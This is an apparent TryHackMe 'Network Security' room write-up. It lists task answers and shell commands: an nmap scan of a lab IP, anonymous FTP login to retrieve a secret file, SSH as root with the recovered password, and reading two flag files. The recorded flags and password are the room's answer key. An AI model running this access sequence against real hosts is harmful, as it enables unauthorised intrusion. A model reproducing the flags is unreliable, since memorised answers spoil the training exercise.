# THM - Network Security

## Task 1

> host firewalls


## Task 2

> recon


## Task 3

```shell
nmap 10.10.160.200

ftp 10.10.160.200
	anonymous
	ls
	get secret.txt
	exit

cat secret.txt
```


### Task 3.1

```shell
cat secret.txt
```

> ABC789xyz123


### Task 3.2

```shell
ssh root@10.10.160.200
	ABC789xyz123
	
	pwd
	ls
	cat flag.txt
```

> THM{FTP_SERVER_OWNED}


### Task 3.3

```shell
	cd /home
	ls
	cd librarian
	pwd
	ls
	cat flag.txt
```

> THM{LIBRARIAN_ACCOUNT_COMPROMISED}


